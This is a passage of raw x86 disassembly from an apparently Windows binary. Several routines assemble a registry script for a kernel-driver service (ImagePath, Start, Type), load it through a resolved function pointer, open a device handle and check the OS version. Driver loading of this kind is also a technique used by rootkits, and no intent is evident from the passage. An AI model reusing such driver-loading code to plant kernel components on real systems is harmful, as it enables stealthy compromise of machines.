  401750:	88 45 b6             	mov    %al,-0x4a(%ebp)
  401753:	b8 44 00 00 00       	mov    $0x44,%eax
  401758:	88 45 b7             	mov    %al,-0x49(%ebp)
  40175b:	b8 57 00 00 00       	mov    $0x57,%eax
  401760:	88 45 b8             	mov    %al,-0x48(%ebp)
  401763:	b8 4f 00 00 00       	mov    $0x4f,%eax
  401768:	88 45 b9             	mov    %al,-0x47(%ebp)
  40176b:	b8 52 00 00 00       	mov    $0x52,%eax
  401770:	88 45 ba             	mov    %al,-0x46(%ebp)
  401773:	b8 44 00 00 00       	mov    $0x44,%eax
  401778:	88 45 bb             	mov    %al,-0x45(%ebp)
  40177b:	b8 20 00 00 00       	mov    $0x20,%eax
  401780:	88 45 bc             	mov    %al,-0x44(%ebp)
  401783:	b8 31 00 00 00       	mov    $0x31,%eax
  401788:	88 45 bd             	mov    %al,-0x43(%ebp)
  40178b:	b8 0d 00 00 00       	mov    $0xd,%eax
  401790:	88 45 be             	mov    %al,-0x42(%ebp)
  401793:	b8 0a 00 00 00       	mov    $0xa,%eax
  401798:	88 45 bf             	mov    %al,-0x41(%ebp)
  40179b:	b8 22 00 00 00       	mov    $0x22,%eax
  4017a0:	88 45 c0             	mov    %al,-0x40(%ebp)
  4017a3:	b8 49 00 00 00       	mov    $0x49,%eax
  4017a8:	88 45 c1             	mov    %al,-0x3f(%ebp)
  4017ab:	b8 6d 00 00 00       	mov    $0x6d,%eax
  4017b0:	88 45 c2             	mov    %al,-0x3e(%ebp)
  4017b3:	b8 61 00 00 00       	mov    $0x61,%eax
  4017b8:	88 45 c3             	mov    %al,-0x3d(%ebp)
  4017bb:	b8 67 00 00 00       	mov    $0x67,%eax
  4017c0:	88 45 c4             	mov    %al,-0x3c(%ebp)
  4017c3:	b8 65 00 00 00       	mov    $0x65,%eax
  4017c8:	88 45 c5             	mov    %al,-0x3b(%ebp)
  4017cb:	b8 50 00 00 00       	mov    $0x50,%eax
  4017d0:	88 45 c6             	mov    %al,-0x3a(%ebp)
  4017d3:	b8 61 00 00 00       	mov    $0x61,%eax
  4017d8:	88 45 c7             	mov    %al,-0x39(%ebp)
  4017db:	b8 74 00 00 00       	mov    $0x74,%eax
  4017e0:	88 45 c8             	mov    %al,-0x38(%ebp)
  4017e3:	b8 68 00 00 00       	mov    $0x68,%eax
  4017e8:	88 45 c9             	mov    %al,-0x37(%ebp)
  4017eb:	b8 22 00 00 00       	mov    $0x22,%eax
  4017f0:	88 45 ca             	mov    %al,-0x36(%ebp)
  4017f3:	b8 20 00 00 00       	mov    $0x20,%eax
  4017f8:	88 45 cb             	mov    %al,-0x35(%ebp)
  4017fb:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401800:	88 45 cc             	mov    %al,-0x34(%ebp)
  401803:	b8 20 00 00 00       	mov    $0x20,%eax
  401808:	88 45 cd             	mov    %al,-0x33(%ebp)
  40180b:	b8 5c 00 00 00       	mov    $0x5c,%eax
  401810:	88 45 ce             	mov    %al,-0x32(%ebp)
  401813:	b8 3f 00 00 00       	mov    $0x3f,%eax
  401818:	88 45 cf             	mov    %al,-0x31(%ebp)
  40181b:	b8 3f 00 00 00       	mov    $0x3f,%eax
  401820:	88 45 d0             	mov    %al,-0x30(%ebp)
  401823:	b8 5c 00 00 00       	mov    $0x5c,%eax
  401828:	88 45 d1             	mov    %al,-0x2f(%ebp)
  40182b:	b8 25 00 00 00       	mov    $0x25,%eax
  401830:	88 45 d2             	mov    %al,-0x2e(%ebp)
  401833:	b8 73 00 00 00       	mov    $0x73,%eax
  401838:	88 45 d3             	mov    %al,-0x2d(%ebp)
  40183b:	b8 0d 00 00 00       	mov    $0xd,%eax
  401840:	88 45 d4             	mov    %al,-0x2c(%ebp)
  401843:	b8 0a 00 00 00       	mov    $0xa,%eax
  401848:	88 45 d5             	mov    %al,-0x2b(%ebp)
  40184b:	b8 53 00 00 00       	mov    $0x53,%eax
  401850:	88 45 d6             	mov    %al,-0x2a(%ebp)
  401853:	b8 74 00 00 00       	mov    $0x74,%eax
  401858:	88 45 d7             	mov    %al,-0x29(%ebp)
  40185b:	b8 61 00 00 00       	mov    $0x61,%eax
  401860:	88 45 d8             	mov    %al,-0x28(%ebp)
  401863:	b8 72 00 00 00       	mov    $0x72,%eax
  401868:	88 45 d9             	mov    %al,-0x27(%ebp)
  40186b:	b8 74 00 00 00       	mov    $0x74,%eax
  401870:	88 45 da             	mov    %al,-0x26(%ebp)
  401873:	b8 20 00 00 00       	mov    $0x20,%eax
  401878:	88 45 db             	mov    %al,-0x25(%ebp)
  40187b:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401880:	88 45 dc             	mov    %al,-0x24(%ebp)
  401883:	b8 20 00 00 00       	mov    $0x20,%eax
  401888:	88 45 dd             	mov    %al,-0x23(%ebp)
  40188b:	b8 52 00 00 00       	mov    $0x52,%eax
  401890:	88 45 de             	mov    %al,-0x22(%ebp)
  401893:	b8 45 00 00 00       	mov    $0x45,%eax
  401898:	88 45 df             	mov    %al,-0x21(%ebp)
  40189b:	b8 47 00 00 00       	mov    $0x47,%eax
  4018a0:	88 45 e0             	mov    %al,-0x20(%ebp)
  4018a3:	b8 5f 00 00 00       	mov    $0x5f,%eax
  4018a8:	88 45 e1             	mov    %al,-0x1f(%ebp)
  4018ab:	b8 44 00 00 00       	mov    $0x44,%eax
  4018b0:	88 45 e2             	mov    %al,-0x1e(%ebp)
  4018b3:	b8 57 00 00 00       	mov    $0x57,%eax
  4018b8:	88 45 e3             	mov    %al,-0x1d(%ebp)
  4018bb:	b8 4f 00 00 00       	mov    $0x4f,%eax
  4018c0:	88 45 e4             	mov    %al,-0x1c(%ebp)
  4018c3:	b8 52 00 00 00       	mov    $0x52,%eax
  4018c8:	88 45 e5             	mov    %al,-0x1b(%ebp)
  4018cb:	b8 44 00 00 00       	mov    $0x44,%eax
  4018d0:	88 45 e6             	mov    %al,-0x1a(%ebp)
  4018d3:	b8 20 00 00 00       	mov    $0x20,%eax
  4018d8:	88 45 e7             	mov    %al,-0x19(%ebp)
  4018db:	b8 33 00 00 00       	mov    $0x33,%eax
  4018e0:	88 45 e8             	mov    %al,-0x18(%ebp)
  4018e3:	b8 0d 00 00 00       	mov    $0xd,%eax
  4018e8:	88 45 e9             	mov    %al,-0x17(%ebp)
  4018eb:	b8 0a 00 00 00       	mov    $0xa,%eax
  4018f0:	88 45 ea             	mov    %al,-0x16(%ebp)
  4018f3:	b8 54 00 00 00       	mov    $0x54,%eax
  4018f8:	88 45 eb             	mov    %al,-0x15(%ebp)
  4018fb:	b8 79 00 00 00       	mov    $0x79,%eax
  401900:	88 45 ec             	mov    %al,-0x14(%ebp)
  401903:	b8 70 00 00 00       	mov    $0x70,%eax
  401908:	88 45 ed             	mov    %al,-0x13(%ebp)
  40190b:	b8 65 00 00 00       	mov    $0x65,%eax
  401910:	88 45 ee             	mov    %al,-0x12(%ebp)
  401913:	b8 20 00 00 00       	mov    $0x20,%eax
  401918:	88 45 ef             	mov    %al,-0x11(%ebp)
  40191b:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401920:	88 45 f0             	mov    %al,-0x10(%ebp)
  401923:	b8 20 00 00 00       	mov    $0x20,%eax
  401928:	88 45 f1             	mov    %al,-0xf(%ebp)
  40192b:	b8 52 00 00 00       	mov    $0x52,%eax
  401930:	88 45 f2             	mov    %al,-0xe(%ebp)
  401933:	b8 45 00 00 00       	mov    $0x45,%eax
  401938:	88 45 f3             	mov    %al,-0xd(%ebp)
  40193b:	b8 47 00 00 00       	mov    $0x47,%eax
  401940:	88 45 f4             	mov    %al,-0xc(%ebp)
  401943:	b8 5f 00 00 00       	mov    $0x5f,%eax
  401948:	88 45 f5             	mov    %al,-0xb(%ebp)
  40194b:	b8 44 00 00 00       	mov    $0x44,%eax
  401950:	88 45 f6             	mov    %al,-0xa(%ebp)
  401953:	b8 57 00 00 00       	mov    $0x57,%eax
  401958:	88 45 f7             	mov    %al,-0x9(%ebp)
  40195b:	b8 4f 00 00 00       	mov    $0x4f,%eax
  401960:	88 45 f8             	mov    %al,-0x8(%ebp)
  401963:	b8 52 00 00 00       	mov    $0x52,%eax
  401968:	88 45 f9             	mov    %al,-0x7(%ebp)
  40196b:	b8 44 00 00 00       	mov    $0x44,%eax
  401970:	88 45 fa             	mov    %al,-0x6(%ebp)
  401973:	b8 20 00 00 00       	mov    $0x20,%eax
  401978:	88 45 fb             	mov    %al,-0x5(%ebp)
  40197b:	b8 31 00 00 00       	mov    $0x31,%eax
  401980:	88 45 fc             	mov    %al,-0x4(%ebp)
  401983:	b8 0d 00 00 00       	mov    $0xd,%eax
  401988:	88 45 fd             	mov    %al,-0x3(%ebp)
  40198b:	b8 0a 00 00 00       	mov    $0xa,%eax
  401990:	88 45 fe             	mov    %al,-0x2(%ebp)
  401993:	b8 00 00 00 00       	mov    $0x0,%eax
  401998:	88 45 ff             	mov    %al,-0x1(%ebp)
  40199b:	b8 00 00 00 00       	mov    $0x0,%eax
  4019a0:	88 85 6d fb ff ff    	mov    %al,-0x493(%ebp)
  4019a6:	b8 ff 03 00 00       	mov    $0x3ff,%eax
  4019ab:	50                   	push   %eax
  4019ac:	b8 00 00 00 00       	mov    $0x0,%eax
  4019b1:	50                   	push   %eax
  4019b2:	8d 85 6e fb ff ff    	lea    -0x492(%ebp),%eax
  4019b8:	50                   	push   %eax
  4019b9:	e8 ca 09 00 00       	call   0x402388
  4019be:	83 c4 0c             	add    $0xc,%esp
  4019c1:	b8 e8 03 00 00       	mov    $0x3e8,%eax
  4019c6:	89 85 68 fb ff ff    	mov    %eax,-0x498(%ebp)
  4019cc:	b8 bc 30 40 00       	mov    $0x4030bc,%eax
  4019d1:	50                   	push   %eax
  4019d2:	e8 a1 09 00 00       	call   0x402378
  4019d7:	b9 c7 30 40 00       	mov    $0x4030c7,%ecx
  4019dc:	51                   	push   %ecx
  4019dd:	50                   	push   %eax
  4019de:	e8 9d 09 00 00       	call   0x402380
  4019e3:	89 85 64 fb ff ff    	mov    %eax,-0x49c(%ebp)
  4019e9:	8b 45 10             	mov    0x10(%ebp),%eax
  4019ec:	50                   	push   %eax
  4019ed:	8b 45 08             	mov    0x8(%ebp),%eax
  4019f0:	50                   	push   %eax
  4019f1:	e8 27 f8 ff ff       	call   0x40121d
  4019f6:	83 c4 08             	add    $0x8,%esp
  4019f9:	83 f8 00             	cmp    $0x0,%eax
  4019fc:	0f 85 67 00 00 00    	jne    0x401a69
  401a02:	8b 45 10             	mov    0x10(%ebp),%eax
  401a05:	50                   	push   %eax
  401a06:	8b 45 0c             	mov    0xc(%ebp),%eax
  401a09:	50                   	push   %eax
  401a0a:	8b 45 0c             	mov    0xc(%ebp),%eax
  401a0d:	50                   	push   %eax
  401a0e:	8d 85 6d ff ff ff    	lea    -0x93(%ebp),%eax
  401a14:	50                   	push   %eax
  401a15:	8d 85 6d fb ff ff    	lea    -0x493(%ebp),%eax
  401a1b:	50                   	push   %eax
  401a1c:	8b 85 64 fb ff ff    	mov    -0x49c(%ebp),%eax
  401a22:	ff d0                	call   *%eax
  401a24:	8b 85 68 fb ff ff    	mov    -0x498(%ebp),%eax
  401a2a:	50                   	push   %eax
  401a2b:	e8 b0 09 00 00       	call   0x4023e0
  401a30:	8d 85 6d fb ff ff    	lea    -0x493(%ebp),%eax
  401a36:	50                   	push   %eax
  401a37:	b8 d1 30 40 00       	mov    $0x4030d1,%eax
  401a3c:	50                   	push   %eax
  401a3d:	e8 9c f6 ff ff       	call   0x4010de
  401a42:	83 c4 08             	add    $0x8,%esp
  401a45:	b8 60 ea 00 00       	mov    $0xea60,%eax
  401a4a:	89 85 68 fb ff ff    	mov    %eax,-0x498(%ebp)
  401a50:	8b 45 10             	mov    0x10(%ebp),%eax
  401a53:	50                   	push   %eax
  401a54:	8b 45 08             	mov    0x8(%ebp),%eax
  401a57:	50                   	push   %eax
  401a58:	e8 c0 f7 ff ff       	call   0x40121d
  401a5d:	83 c4 08             	add    $0x8,%esp
  401a60:	83 f8 00             	cmp    $0x0,%eax
  401a63:	0f 84 bb ff ff ff    	je     0x401a24
  401a69:	b8 d8 30 40 00       	mov    $0x4030d8,%eax
  401a6e:	50                   	push   %eax
  401a6f:	e8 74 09 00 00       	call   0x4023e8
  401a74:	c9                   	leave
  401a75:	c3                   	ret
  401a76:	55                   	push   %ebp
  401a77:	89 e5                	mov    %esp,%ebp
  401a79:	81 ec 00 00 00 00    	sub    $0x0,%esp
  401a7f:	90                   	nop
  401a80:	e8 6b 09 00 00       	call   0x4023f0
  401a85:	b9 00 00 00 00       	mov    $0x0,%ecx
  401a8a:	51                   	push   %ecx
  401a8b:	50                   	push   %eax
  401a8c:	e8 67 09 00 00       	call   0x4023f8
  401a91:	b8 00 00 00 00       	mov    $0x0,%eax
  401a96:	e9 00 00 00 00       	jmp    0x401a9b
  401a9b:	c9                   	leave
  401a9c:	c2 04 00             	ret    $0x4
  401a9f:	55                   	push   %ebp
  401aa0:	89 e5                	mov    %esp,%ebp
  401aa2:	81 ec 04 00 00 00    	sub    $0x4,%esp
  401aa8:	90                   	nop
  401aa9:	b8 00 00 00 00       	mov    $0x0,%eax
  401aae:	50                   	push   %eax
  401aaf:	b8 80 00 00 00       	mov    $0x80,%eax
  401ab4:	50                   	push   %eax
  401ab5:	b8 03 00 00 00       	mov    $0x3,%eax
  401aba:	50                   	push   %eax
  401abb:	b8 00 00 00 00       	mov    $0x0,%eax
  401ac0:	50                   	push   %eax
  401ac1:	b8 03 00 00 00       	mov    $0x3,%eax
  401ac6:	50                   	push   %eax
  401ac7:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  401acc:	50                   	push   %eax
  401acd:	b8 df d5 41 00       	mov    $0x41d5df,%eax
  401ad2:	50                   	push   %eax
  401ad3:	e8 c0 08 00 00       	call   0x402398
  401ad8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401adb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401ade:	83 f8 ff             	cmp    $0xffffffff,%eax
  401ae1:	0f 84 13 00 00 00    	je     0x401afa
  401ae7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401aea:	50                   	push   %eax
  401aeb:	e8 c0 08 00 00       	call   0x4023b0
  401af0:	b8 01 00 00 00       	mov    $0x1,%eax
  401af5:	e9 0a 00 00 00       	jmp    0x401b04
  401afa:	b8 00 00 00 00       	mov    $0x0,%eax
  401aff:	e9 00 00 00 00       	jmp    0x401b04
  401b04:	c9                   	leave
  401b05:	c3                   	ret
  401b06:	55                   	push   %ebp
  401b07:	89 e5                	mov    %esp,%ebp
  401b09:	81 ec 04 00 00 00    	sub    $0x4,%esp
  401b0f:	90                   	nop
  401b10:	b8 00 00 00 00       	mov    $0x0,%eax
  401b15:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b18:	39 c8                	cmp    %ecx,%eax
  401b1a:	0f 85 05 00 00 00    	jne    0x401b25
  401b20:	e9 33 00 00 00       	jmp    0x401b58
  401b25:	b8 ed d5 41 00       	mov    $0x41d5ed,%eax
  401b2a:	50                   	push   %eax
  401b2b:	e8 d0 08 00 00       	call   0x402400
  401b30:	b9 f6 d5 41 00       	mov    $0x41d5f6,%ecx
  401b35:	51                   	push   %ecx
  401b36:	50                   	push   %eax
  401b37:	e8 44 08 00 00       	call   0x402380
  401b3c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b3f:	b8 00 00 00 00       	mov    $0x0,%eax
  401b44:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b47:	39 c8                	cmp    %ecx,%eax
  401b49:	0f 84 09 00 00 00    	je     0x401b58
  401b4f:	8b 45 08             	mov    0x8(%ebp),%eax
  401b52:	50                   	push   %eax
  401b53:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401b56:	ff d0                	call   *%eax
  401b58:	c9                   	leave
  401b59:	c3                   	ret
  401b5a:	55                   	push   %ebp
  401b5b:	89 e5                	mov    %esp,%ebp
  401b5d:	81 ec 28 00 00 00    	sub    $0x28,%esp
  401b63:	90                   	nop
  401b64:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401b67:	50                   	push   %eax
  401b68:	e8 99 ff ff ff       	call   0x401b06
  401b6d:	83 c4 04             	add    $0x4,%esp
  401b70:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401b73:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401b76:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401b79:	0f b7 08             	movzwl (%eax),%ecx
  401b7c:	83 f9 09             	cmp    $0x9,%ecx
  401b7f:	0f 84 14 00 00 00    	je     0x401b99
  401b85:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401b88:	0f b7 08             	movzwl (%eax),%ecx
  401b8b:	83 f9 06             	cmp    $0x6,%ecx
  401b8e:	0f 84 05 00 00 00    	je     0x401b99
  401b94:	e9 0a 00 00 00       	jmp    0x401ba3
  401b99:	b8 40 00 00 00       	mov    $0x40,%eax
  401b9e:	e9 0a 00 00 00       	jmp    0x401bad
  401ba3:	b8 20 00 00 00       	mov    $0x20,%eax
  401ba8:	e9 00 00 00 00       	jmp    0x401bad
  401bad:	c9                   	leave
  401bae:	c3                   	ret
  401baf:	55                   	push   %ebp
  401bb0:	89 e5                	mov    %esp,%ebp
  401bb2:	81 ec 04 00 00 00    	sub    $0x4,%esp
  401bb8:	90                   	nop
  401bb9:	b8 00 00 00 00       	mov    $0x0,%eax
  401bbe:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401bc1:	8b 45 08             	mov    0x8(%ebp),%eax
  401bc4:	0f be 08             	movsbl (%eax),%ecx
  401bc7:	83 f9 00             	cmp    $0x0,%ecx
  401bca:	0f 84 22 00 00 00    	je     0x401bf2
  401bd0:	8b 45 08             	mov    0x8(%ebp),%eax
  401bd3:	0f be 08             	movsbl (%eax),%ecx
  401bd6:	83 f9 5c             	cmp    $0x5c,%ecx
  401bd9:	0f 85 06 00 00 00    	jne    0x401be5
  401bdf:	8b 45 08             	mov    0x8(%ebp),%eax
  401be2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401be5:	8b 45 08             	mov    0x8(%ebp),%eax
  401be8:	89 c1                	mov    %eax,%ecx
  401bea:	83 c0 01             	add    $0x1,%eax
  401bed:	89 45 08             	mov    %eax,0x8(%ebp)
  401bf0:	eb cf                	jmp    0x401bc1
  401bf2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401bf5:	83 f8 00             	cmp    $0x0,%eax
  401bf8:	0f 84 0a 00 00 00    	je     0x401c08
  401bfe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401c01:	b9 00 00 00 00       	mov    $0x0,%ecx
  401c06:	88 08                	mov    %cl,(%eax)
  401c08:	c9                   	leave
  401c09:	c3                   	ret
  401c0a:	55                   	push   %ebp
  401c0b:	89 e5                	mov    %esp,%ebp
  401c0d:	81 ec 3c 00 00 00    	sub    $0x3c,%esp
  401c13:	90                   	nop
  401c14:	b8 00 00 00 00       	mov    $0x0,%eax
  401c19:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c1c:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401c1f:	50                   	push   %eax
  401c20:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401c23:	50                   	push   %eax
  401c24:	8b 45 08             	mov    0x8(%ebp),%eax
  401c27:	50                   	push   %eax
  401c28:	e8 db 07 00 00       	call   0x402408
  401c2d:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401c30:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401c33:	85 c0                	test   %eax,%eax
  401c35:	0f 84 2f 00 00 00    	je     0x401c6a
  401c3b:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401c3e:	83 c0 20             	add    $0x20,%eax
  401c41:	8b 08                	mov    (%eax),%ecx
  401c43:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  401c46:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401c49:	83 c0 1c             	add    $0x1c,%eax
  401c4c:	8b 08                	mov    (%eax),%ecx
  401c4e:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  401c51:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  401c54:	83 c0 04             	add    $0x4,%eax
  401c57:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401c5a:	89 08                	mov    %ecx,(%eax)
  401c5c:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401c5f:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401c62:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401c65:	e9 0a 00 00 00       	jmp    0x401c74
  401c6a:	b8 00 00 00 00       	mov    $0x0,%eax
  401c6f:	e9 00 00 00 00       	jmp    0x401c74
  401c74:	c9                   	leave
  401c75:	c3                   	ret
  401c76:	55                   	push   %ebp
  401c77:	89 e5                	mov    %esp,%ebp
  401c79:	81 ec 10 00 00 00    	sub    $0x10,%esp
  401c7f:	90                   	nop
  401c80:	8b 45 0c             	mov    0xc(%ebp),%eax
  401c83:	50                   	push   %eax
  401c84:	e8 87 07 00 00       	call   0x402410
  401c89:	c1 e0 01             	shl    $0x1,%eax
  401c8c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c8f:	8b 45 10             	mov    0x10(%ebp),%eax
  401c92:	50                   	push   %eax
  401c93:	e8 78 07 00 00       	call   0x402410
  401c98:	c1 e0 01             	shl    $0x1,%eax
  401c9b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c9e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401ca1:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401ca4:	01 c8                	add    %ecx,%eax
  401ca6:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401ca9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401cac:	81 f8 ff ff 00 00    	cmp    $0xffff,%eax
  401cb2:	0f 86 0a 00 00 00    	jbe    0x401cc2
  401cb8:	b8 6f 00 00 00       	mov    $0x6f,%eax
  401cbd:	e9 91 00 00 00       	jmp    0x401d53
  401cc2:	e8 51 07 00 00       	call   0x402418
  401cc7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401cca:	51                   	push   %ecx
  401ccb:	b9 00 00 00 00       	mov    $0x0,%ecx
  401cd0:	51                   	push   %ecx
  401cd1:	50                   	push   %eax
  401cd2:	e8 49 07 00 00       	call   0x402420
  401cd7:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401cda:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401cdd:	83 f8 00             	cmp    $0x0,%eax
  401ce0:	0f 85 0a 00 00 00    	jne    0x401cf0
  401ce6:	e8 3d 07 00 00       	call   0x402428
  401ceb:	e9 63 00 00 00       	jmp    0x401d53
  401cf0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401cf3:	50                   	push   %eax
  401cf4:	8b 45 0c             	mov    0xc(%ebp),%eax
  401cf7:	50                   	push   %eax
  401cf8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401cfb:	50                   	push   %eax
  401cfc:	e8 2f 07 00 00       	call   0x402430
  401d01:	83 c4 0c             	add    $0xc,%esp
  401d04:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401d07:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401d0a:	01 c8                	add    %ecx,%eax
  401d0c:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401d0f:	51                   	push   %ecx
  401d10:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401d13:	51                   	push   %ecx
  401d14:	50                   	push   %eax
  401d15:	e8 16 07 00 00       	call   0x402430
  401d1a:	83 c4 0c             	add    $0xc,%esp
  401d1d:	8b 45 08             	mov    0x8(%ebp),%eax
  401d20:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401d23:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  401d29:	66 89 08             	mov    %cx,(%eax)
  401d2c:	8b 45 08             	mov    0x8(%ebp),%eax
  401d2f:	83 c0 02             	add    $0x2,%eax
  401d32:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401d35:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  401d3b:	66 89 08             	mov    %cx,(%eax)
  401d3e:	8b 45 08             	mov    0x8(%ebp),%eax
  401d41:	83 c0 04             	add    $0x4,%eax
  401d44:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401d47:	89 08                	mov    %ecx,(%eax)
  401d49:	b8 00 00 00 00       	mov    $0x0,%eax
  401d4e:	e9 00 00 00 00       	jmp    0x401d53
  401d53:	c9                   	leave
  401d54:	c3                   	ret
  401d55:	55                   	push   %ebp
  401d56:	89 e5                	mov    %esp,%ebp
  401d58:	81 ec 10 00 00 00    	sub    $0x10,%esp
  401d5e:	90                   	nop
  401d5f:	8b 45 0c             	mov    0xc(%ebp),%eax
  401d62:	50                   	push   %eax
  401d63:	e8 a8 06 00 00       	call   0x402410
  401d68:	c1 e0 01             	shl    $0x1,%eax
  401d6b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401d6e:	8b 45 10             	mov    0x10(%ebp),%eax
  401d71:	50                   	push   %eax
  401d72:	e8 99 06 00 00       	call   0x402410
  401d77:	c1 e0 01             	shl    $0x1,%eax
  401d7a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401d7d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401d80:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401d83:	01 c8                	add    %ecx,%eax
  401d85:	83 c0 02             	add    $0x2,%eax
  401d88:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401d8b:	e8 88 06 00 00       	call   0x402418
  401d90:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401d93:	51                   	push   %ecx
  401d94:	b9 00 00 00 00       	mov    $0x0,%ecx
  401d99:	51                   	push   %ecx
  401d9a:	50                   	push   %eax
  401d9b:	e8 80 06 00 00       	call   0x402420
  401da0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401da3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401da6:	83 f8 00             	cmp    $0x0,%eax
  401da9:	0f 85 0a 00 00 00    	jne    0x401db9
  401daf:	e8 74 06 00 00       	call   0x402428
  401db4:	e9 42 00 00 00       	jmp    0x401dfb
  401db9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401dbc:	50                   	push   %eax
  401dbd:	8b 45 0c             	mov    0xc(%ebp),%eax
  401dc0:	50                   	push   %eax
  401dc1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401dc4:	50                   	push   %eax
  401dc5:	e8 66 06 00 00       	call   0x402430
  401dca:	83 c4 0c             	add    $0xc,%esp
  401dcd:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401dd0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401dd3:	01 c8                	add    %ecx,%eax
  401dd5:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401dd8:	83 c1 02             	add    $0x2,%ecx
  401ddb:	51                   	push   %ecx
  401ddc:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401ddf:	51                   	push   %ecx
  401de0:	50                   	push   %eax
  401de1:	e8 4a 06 00 00       	call   0x402430
  401de6:	83 c4 0c             	add    $0xc,%esp
  401de9:	8b 45 08             	mov    0x8(%ebp),%eax
  401dec:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401def:	89 08                	mov    %ecx,(%eax)
  401df1:	b8 00 00 00 00       	mov    $0x0,%eax
  401df6:	e9 00 00 00 00       	jmp    0x401dfb
  401dfb:	c9                   	leave
  401dfc:	c3                   	ret
  401dfd:	55                   	push   %ebp
  401dfe:	89 e5                	mov    %esp,%ebp
  401e00:	81 ec 00 00 00 00    	sub    $0x0,%esp
  401e06:	90                   	nop
  401e07:	e8 0c 06 00 00       	call   0x402418
  401e0c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401e0f:	83 c1 04             	add    $0x4,%ecx
  401e12:	8b 11                	mov    (%ecx),%edx
  401e14:	52                   	push   %edx
  401e15:	b9 00 00 00 00       	mov    $0x0,%ecx
  401e1a:	51                   	push   %ecx
  401e1b:	50                   	push   %eax
  401e1c:	e8 17 06 00 00       	call   0x402438
  401e21:	c9                   	leave
  401e22:	c3                   	ret
  401e23:	55                   	push   %ebp
  401e24:	89 e5                	mov    %esp,%ebp
  401e26:	81 ec 00 00 00 00    	sub    $0x0,%esp
  401e2c:	90                   	nop
  401e2d:	e8 e6 05 00 00       	call   0x402418
  401e32:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401e35:	51                   	push   %ecx
  401e36:	b9 00 00 00 00       	mov    $0x0,%ecx
  401e3b:	51                   	push   %ecx
  401e3c:	50                   	push   %eax
  401e3d:	e8 f6 05 00 00       	call   0x402438
  401e42:	c9                   	leave
  401e43:	c3                   	ret
  401e44:	55                   	push   %ebp
  401e45:	89 e5                	mov    %esp,%ebp
  401e47:	81 ec 24 00 00 00    	sub    $0x24,%esp
  401e4d:	90                   	nop
  401e4e:	b8 0a d6 41 00       	mov    $0x41d60a,%eax
  401e53:	50                   	push   %eax
  401e54:	e8 1f 05 00 00       	call   0x402378
  401e59:	b9 17 d6 41 00       	mov    $0x41d617,%ecx
  401e5e:	51                   	push   %ecx
  401e5f:	50                   	push   %eax
  401e60:	e8 1b 05 00 00       	call   0x402380
  401e65:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401e68:	b8 2d d6 41 00       	mov    $0x41d62d,%eax
  401e6d:	50                   	push   %eax
  401e6e:	e8 05 05 00 00       	call   0x402378
  401e73:	b9 3a d6 41 00       	mov    $0x41d63a,%ecx
  401e78:	51                   	push   %ecx
  401e79:	50                   	push   %eax
  401e7a:	e8 01 05 00 00       	call   0x402380
